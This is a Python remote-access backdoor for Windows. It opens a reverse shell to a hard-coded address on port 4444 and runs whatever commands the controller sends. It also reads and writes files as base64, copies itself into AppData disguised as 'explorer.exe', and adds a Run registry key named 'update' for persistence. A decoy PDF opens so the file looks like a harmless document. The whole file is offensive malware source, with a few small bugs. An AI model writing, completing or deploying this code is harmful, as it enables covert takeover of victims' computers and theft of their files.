import socket
import subprocess
import json
import os
import sys
import shutil
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.persistence
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    # Make the backdoor persistence
    def persistence(self):
        try:
            persistence_file = os.path.join(os.environ["appdata"], "explorer.exe")

            if os.path.exists(persistence_file):
                shutil.copyfile(sys.executable, persistence_file)

            # Try HKLM first (admin privileges)
            if not self.registry_key_exists("HKLM", persistence_file):
                if not self.add_to_registry("HKLM", persistence_file):
                    # Fall back to HKCU if HKLM fails (standard user mode)
                    self.add_to_registry("HKCU", persistence_file)
            # Detach and exit if not already running from the persistence file location
            if sys.executable != persistence_file:
                self.launch_detached(persistence_file)
        except Exception as e:
            pass

    def registry_key_exists(self, hive, path):
        reg_path = f"{hive}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        check_cmd = f'reg query "{reg_path}" /v update'
        result = subprocess.run(check_cmd, capture_output=True, shell=True, text=True)
        return "update" in result.stdout
    
    def add_to_registry(self, hive, path):
        try:
            reg_path = f"{hive}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            add_cmd = f'reg add "{reg_path}" /v update /t REG_SZ /d "{path}" /f'
            subprocess.call(add_cmd, shell=True)
            return True
        except Exception:
            return False
    
    def launch_detached(self, path):
        try:
            subprocess.Popen(
                f'"{path}"',
                shell=True,
                creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
        except Exception:
            pass

    def execute_cmd_command(self, command):
        return subprocess.check_output(command, shell=True).decode()

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data  = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def change_working_directory(self, path):
        os.chdir(path)
        return f"[+] Changing working directory to {path}"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_cmd_command(" ".join(command))
            except Exception as e:
                command_result = (f"[-] Error during command execution: {e}")
            self.reliable_send(command_result)

# Trojanized PDF execution "Change the file path according to you needs"
try:
    file_path = sys._MEIPASS + "sample.pdf"
    subprocess.Popen(file_path, shell=True)
except Exception:
    pass

# Start the backdoor
try:
    my_backdoor = Backdoor("192.168.0.110", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()
